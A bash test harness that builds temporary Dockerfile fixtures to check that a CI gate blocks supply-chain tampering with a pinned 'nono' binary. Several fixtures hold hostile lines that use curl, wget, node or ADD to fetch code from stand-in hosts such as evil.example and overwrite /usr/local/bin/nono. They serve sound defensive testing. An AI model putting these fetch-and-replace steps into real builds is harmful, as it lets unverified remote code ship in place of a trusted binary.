#!/usr/bin/env bash
# test-check-nono-pin.sh — executable fails-first fixtures for check-nono-pin.sh
# (cli#341 S4).
#
# The gate's evidence base used to be prose in a script header: nothing re-ran
# the shapes it claims to reject. This harness builds each fixture in a temp tree
# and asserts the gate's exit code, so the gate cannot be silently weakened, and
# asserts .github/workflows/test.yml still invokes it, so a later workflow edit
# cannot silently orphan it.
#
# Every fixture below MUST FAIL the gate (exit non-zero); the positive control
# (the real repo) MUST pass. Fixtures are generated at run time rather than
# committed as Dockerfiles so the intentionally-insecure shapes never sit in the
# tree for SAST/build-context scanners to trip over.
set -uo pipefail

here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
repo_root="$(cd "$here/.." && pwd)"
gate="$here/check-nono-pin.sh"
work="$(mktemp -d)"
trap 'rm -rf "$work"' EXIT

npass=0
nfail=0

good_pin() {
  cat >"$1/.nono-version" <<'EOF'
version=0.74.0
commit=bc1406e9ceb0b765d303a015502fade11f3858f5
EOF
}

# The known-good nono stage, reused by the tampering fixtures. It records the
# sha256 of the binary it built at the asserted commit (rule 8's baseline).
good_stage() {
  cat <<'EOF'
FROM rust:bookworm AS nono-builder
COPY .nono-version /tmp/.nono-version
RUN set -eux; \
    . /tmp/.nono-version; \
    git clone --filter=blob:none https://github.com/nolabs-ai/nono /tmp/nono; \
    git -C /tmp/nono checkout "${commit}"; \
    test "$(git -C /tmp/nono rev-parse HEAD)" = "${commit}"; \
    cd /tmp/nono; \
    cargo build --release -p nono-cli; \
    cp target/release/nono /usr/local/bin/nono; \
    sha256sum target/release/nono | cut -d' ' -f1 > /nono.sha256
EOF
}

# The known-good runtime stage: the pinned COPY for the binary, the pinned hash,
# and the artifact assertion as the LAST instruction — rule 8's positive
# invariant. Any base stage that does not end this way is refused.
good_base() {
  cat <<'EOF'
FROM node:24-bookworm-slim AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
RUN groupadd -r tps && useradd -r -g tps -m -s /bin/bash tps
COPY docker/tps-office-supervisor.sh /usr/local/bin/tps-office-supervisor
ENTRYPOINT ["tps-office-supervisor"]
RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
EOF
}

run_case() { # <name> <expect:pass|fail> <fixture-dir>
  local name="$1" expect="$2" dir="$3" rc=0
  NONO_PIN_ROOT="$dir" bash "$gate" >/dev/null 2>&1 || rc=$?
  if { [ "$expect" = fail ] && [ "$rc" -ne 0 ]; } || { [ "$expect" = pass ] && [ "$rc" -eq 0 ]; }; then
    printf 'PASS  %-26s gate exited %s (expected %s)\n' "$name" "$rc" "$expect"
    npass=$((npass + 1))
  else
    printf 'FAIL  %-26s gate exited %s (expected %s)\n' "$name" "$rc" "$expect"
    nfail=$((nfail + 1))
  fi
}

mk() { mkdir -p "$work/$1/docker"; echo "$work/$1"; }

# ── Positive control: the real repository must pass ──────────────────────────
rc=0
bash "$gate" >/dev/null 2>&1 || rc=$?
if [ "$rc" -eq 0 ]; then
  printf 'PASS  %-26s gate exited 0 (expected pass)\n' "real-tree (control)"; npass=$((npass + 1))
else
  printf 'FAIL  %-26s gate exited %s (expected pass)\n' "real-tree (control)" "$rc"; nfail=$((nfail + 1))
fi

# ── 1. Pre-S4 form: unpinned default-branch clone, no pin file ───────────────
d="$(mk pre-s4)"
cat >"$d/docker/Dockerfile" <<'EOF'
FROM rust:bookworm AS nono-builder
RUN apt-get update && apt-get install -y git ca-certificates
RUN git clone --depth 1 https://github.com/nolabs-ai/nono.git /tmp/nono && \
    cd /tmp/nono && cargo build --release -p nono-cli && \
    cp target/release/nono /usr/local/bin/nono
FROM node:24-bookworm-slim AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
EOF
run_case "pre-s4-clone" fail "$d"

# ── 2. --branch v0.74.0 fetch ────────────────────────────────────────────────
d="$(mk branch-tag)"; good_pin "$d"
cat >"$d/docker/Dockerfile" <<'EOF'
FROM rust:bookworm AS nono-builder
COPY .nono-version /tmp/.nono-version
RUN . /tmp/.nono-version; \
    git clone --branch v0.74.0 https://github.com/nolabs-ai/nono /tmp/nono; \
    cd /tmp/nono; cargo build --release -p nono-cli; \
    cp target/release/nono /usr/local/bin/nono
FROM node:24-bookworm-slim AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
EOF
run_case "branch-v0.74.0" fail "$d"

# ── 3. Tampered pin: commit= is not a 40-char commit id ──────────────────────
d="$(mk tampered-pin)"
cat >"$d/.nono-version" <<'EOF'
version=0.74.0
commit=deadbeef
EOF
good_stage >"$d/docker/Dockerfile"
run_case "tampered-pin" fail "$d"

# ── 4. Extra key in .nono-version (e.g. a re-introduced sha256=) ─────────────
d="$(mk extra-key)"; good_pin "$d"
printf 'sha256=abc\n' >>"$d/.nono-version"
good_stage >"$d/docker/Dockerfile"
run_case "extra-key" fail "$d"

# ── 5. Two-stage bypass (Sherlock/Kern): pinned stage, unpinned shipped bytes ─
d="$(mk two-stage-bypass)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM rust:bookworm AS nono-extra
RUN git clone --depth 1 --branch main https://github.com/evil/nono /tmp/e; cp /tmp/e/target/release/nono /tmp/nono
FROM node:24-bookworm-slim AS base
COPY --from=nono-extra /tmp/nono /usr/local/bin/nono
EOF
} >"$d/docker/Dockerfile"
run_case "two-stage-bypass" fail "$d"

# ── 6. Crafted second stage: look-alike repo, pinned-looking sha, no keywords ─
d="$(mk noncanonical-url)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM rust:bookworm AS nono-extra
RUN git clone --filter=blob:none https://github.com/evil/nono /tmp/e; \
    git -C /tmp/e checkout 1111111111111111111111111111111111111111; \
    cd /tmp/e; cargo build --release -p nono-cli; cp target/release/nono /tmp/nono
FROM node:24-bookworm-slim AS base
COPY --from=nono-extra /tmp/nono /usr/local/bin/nono
EOF
} >"$d/docker/Dockerfile"
run_case "noncanonical-url" fail "$d"

# ── 7. Canonical repo but default-branch (moving) clone in a second stage ────
d="$(mk canonical-default-branch)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM rust:bookworm AS nono-extra
RUN git clone --filter=blob:none https://github.com/nolabs-ai/nono /tmp/e; \
    cd /tmp/e; cargo build --release -p nono-cli; cp target/release/nono /tmp/nono
FROM node:24-bookworm-slim AS base
COPY --from=nono-extra /tmp/nono /usr/local/bin/nono
EOF
} >"$d/docker/Dockerfile"
run_case "canonical-default-branch" fail "$d"

# ── 8. Remote ADD in a second stage, consumed by COPY --from (Kern C) ────────
d="$(mk remote-add-url)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM rust:bookworm AS nono-extra
ADD https://github.com/evil/nono/releases/latest/download/nono-linux.tar.gz /tmp/n
FROM node:24-bookworm-slim AS base
COPY --from=nono-extra /tmp/n /usr/local/bin/nono
EOF
} >"$d/docker/Dockerfile"
run_case "remote-add-url" fail "$d"

# ── 9. COPY --from a moving image ref (no clone, no scheme, no keyword) ──────
d="$(mk image-ref-copy)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM node:24-bookworm-slim AS base
COPY --from=evil/nono:latest /usr/local/bin/nono /usr/local/bin/nono
EOF
} >"$d/docker/Dockerfile"
run_case "image-ref-copy" fail "$d"

# ── 10. A moving image stage consumed by name (Sherlock B) ───────────────────
d="$(mk image-ref-stage)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM ghcr.io/evil/nono:latest AS nono-extra
FROM node:24-bookworm-slim AS base
COPY --from=nono-extra /usr/local/bin/nono /usr/local/bin/nono
EOF
} >"$d/docker/Dockerfile"
run_case "image-ref-stage" fail "$d"

# ── 11. ADD a tarball on a non-main ref (no keyword for the word-scan) ───────
d="$(mk add-nonmain-tarball)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM node:24-bookworm-slim AS base
ADD https://codeload.github.com/evil/nono/tar.gz/stable-x /tmp/n.tgz
EOF
} >"$d/docker/Dockerfile"
run_case "add-nonmain-tarball" fail "$d"

# ── 12. ADD a canonical-host tarball at a pinned-looking path (Sherlock D) ───
d="$(mk add-pinned-looking-tarball)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM node:24-bookworm-slim AS base
ADD https://codeload.github.com/evil/nono/tar.gz/1111111111111111111111111111111111111111 /tmp/n.tgz
EOF
} >"$d/docker/Dockerfile"
run_case "add-pinned-looking-tarball" fail "$d"

# ── 13. Positive: digest-pinned bases + COPY --from=nono-builder must pass ───
# Proves rule 6 is not "reject all COPY --from / all images".
d="$(mk digest-pinned-control)"; good_pin "$d"
cat >"$d/docker/Dockerfile" <<'EOF'
FROM rust:bookworm@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa AS nono-builder
COPY .nono-version /tmp/.nono-version
RUN set -eux; \
    . /tmp/.nono-version; \
    git clone --filter=blob:none https://github.com/nolabs-ai/nono /tmp/nono; \
    git -C /tmp/nono checkout "${commit}"; \
    test "$(git -C /tmp/nono rev-parse HEAD)" = "${commit}"; \
    cd /tmp/nono; \
    cargo build --release -p nono-cli; \
    cp target/release/nono /usr/local/bin/nono; \
    sha256sum target/release/nono | cut -d' ' -f1 > /nono.sha256
FROM node:24-bookworm-slim@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
EOF
run_case "digest-pinned-control" pass "$d"

# ── 14. RUN pulls a nono tarball into the shipped binary path (Sherlock B1) ──
d="$(mk run-curl-fetch)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM node:24-bookworm-slim AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
RUN curl -fsSL https://codeload.github.com/evil/nono/tar.gz/stable-x | tar xz -C /usr/local/bin
EOF
} >"$d/docker/Dockerfile"
run_case "run-curl-fetch" fail "$d"

# ── 15. RUN --mount=type=bind,from=<image> (COPY --from in RUN position) ────
d="$(mk run-mount-from-image)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM node:24-bookworm-slim AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
RUN --mount=type=bind,from=evil/nono:latest,target=/s cp /s/nono /usr/local/bin/nono
EOF
} >"$d/docker/Dockerfile"
run_case "run-mount-from-image" fail "$d"

# ── 16. ADD --checksum=<url> — a flag between ADD and the URL (Sherlock B3) ──
d="$(mk add-checksum-url)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM node:24-bookworm-slim AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
ADD --checksum=sha256:1111111111111111111111111111111111111111111111111111111111111111 https://codeload.github.com/evil/nono/tar.gz/stable-x /tmp/n.tgz
EOF
} >"$d/docker/Dockerfile"
run_case "add-checksum-url" fail "$d"

# ── 17. Heredoc RUN body carrying the same fetch primitive ───────────────────
d="$(mk run-heredoc-fetch)"; good_pin "$d"
{ good_stage; cat <<'OUTER'
FROM node:24-bookworm-slim AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
RUN <<'EOF'
wget -qO /usr/local/bin/nono https://evil.example/nono-bin
EOF
OUTER
} >"$d/docker/Dockerfile"
run_case "run-heredoc-fetch" fail "$d"

# ── 18. Positive: RUN --mount from the pinned stage must still pass ─────────
# Proves rule 7b is not "reject all mounts".
d="$(mk run-mount-pinned-control)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM node:24-bookworm-slim AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
RUN --mount=type=bind,from=nono-builder,target=/m true
RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
EOF
} >"$d/docker/Dockerfile"
run_case "run-mount-pinned-control" pass "$d"

# ── 19. Variable-directory rewrite of the shipped path (Sherlock round 5) ────
# The `mv` target is `$d/nono`, so no literal path is spelled and rule 7 cannot
# see it. The gate refuses the stage because it does not END with the artifact
# assertion — and if it did, the assertion would fail the BUILD (fixture 25).
d="$(mk var-dir-mv)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM node:24-bookworm-slim AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
RUN node -e 'require("https").get("https://evil.example/payload",r=>r.pipe(require("fs").createWriteStream("/tmp/b")))'
RUN d=/usr/local/bin; mv /tmp/b $d/nono
EOF
} >"$d/docker/Dockerfile"
run_case "var-dir-mv" fail "$d"

# ── 20. Double-slash spelling of the shipped path ───────────────────────────
d="$(mk slash-path-write)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM node:24-bookworm-slim AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
RUN mv /tmp/x /usr/local//bin/nono
RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
EOF
} >"$d/docker/Dockerfile"
run_case "slash-path-write" fail "$d"

# ── 21. `/./` component spelling of the shipped path ─────────────────────────
d="$(mk dotslash-path-write)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM node:24-bookworm-slim AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
RUN mv /tmp/x /usr/local/bin/./nono
RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
EOF
} >"$d/docker/Dockerfile"
run_case "dotslash-path-write" fail "$d"

# ── 22. Quoted operand spelling of the shipped path ──────────────────────────
d="$(mk quoted-path-write)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM node:24-bookworm-slim AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
RUN ln -sf /tmp/x /usr/local/bin/"nono"
RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
EOF
} >"$d/docker/Dockerfile"
run_case "quoted-path-write" fail "$d"

# ── 23. Split-quote spelling of the shipped path ────────────────────────────
d="$(mk split-quote-path-write)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM node:24-bookworm-slim AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
RUN ln -sf /tmp/x /usr/local/bin/"non"o
RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
EOF
} >"$d/docker/Dockerfile"
run_case "split-quote-path-write" fail "$d"

# ── 24. node as the fetcher (base image is node — always present) ───────────
# Rule 7's primitive list does not name node; the path whitelist in rule 8 does,
# because a fetcher that writes the shipped path must still spell it.
d="$(mk node-fetcher-path-write)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM node:24-bookworm-slim AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
COPY --from=nono-builder /nono.sha256 /tmp/nono.sha256
RUN node -e 'require("https").get("https://evil.example/p",r=>r.pipe(require("fs").createWriteStream("/usr/local/bin/nono")))'
RUN test "$(sha256sum /usr/local/bin/nono | cut -d' ' -f1)" = "$(cat /tmp/nono.sha256)" && rm -f /tmp/nono.sha256
EOF
} >"$d/docker/Dockerfile"
run_case "node-fetcher-path-write" fail "$d"

# ── 25. Positive: the artifact-assertion shape must pass ────────────────────
# Proves rule 8 is the whitelist it claims: pinned COPY + recorded hash +
# assertion last. (The real tree is the stronger positive control above.)
d="$(mk sha256-assertion-control)"; good_pin "$d"
{ good_stage; good_base; } >"$d/docker/Dockerfile"
run_case "sha256-assertion-control" pass "$d"

# ── Regression guard: the CI workflow must still invoke the gate ─────────────
if grep -qF './scripts/check-nono-pin.sh' "$repo_root/.github/workflows/test.yml"; then
  printf 'PASS  %-26s test.yml invokes check-nono-pin.sh\n' "workflow-invokes-gate"; npass=$((npass + 1))
else
  printf 'FAIL  %-26s test.yml no longer invokes check-nono-pin.sh\n' "workflow-invokes-gate"; nfail=$((nfail + 1))
fi

printf '\ntest-check-nono-pin: %d passed, %d failed\n' "$npass" "$nfail"
[ "$nfail" -eq 0 ]
